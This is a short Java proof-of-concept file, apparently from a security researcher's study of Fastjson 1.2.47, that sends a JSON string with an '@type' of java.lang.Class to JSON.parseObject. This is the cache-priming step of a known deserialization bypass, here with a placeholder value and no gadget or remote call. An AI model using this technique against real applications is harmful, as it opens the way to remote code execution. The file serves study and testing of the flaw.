package org.h3rmesk1t.Fastjson.fastjson47;

import com.alibaba.fastjson.JSON;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/8 2:29 下午
 */
public class POC {

    public static void main(String[] args) {

        String jsonString = "{\"@type\":\"java.lang.Class\",\"val\":\"h3rmesk1t\"}";
        JSON.parseObject(jsonString);
    }
}
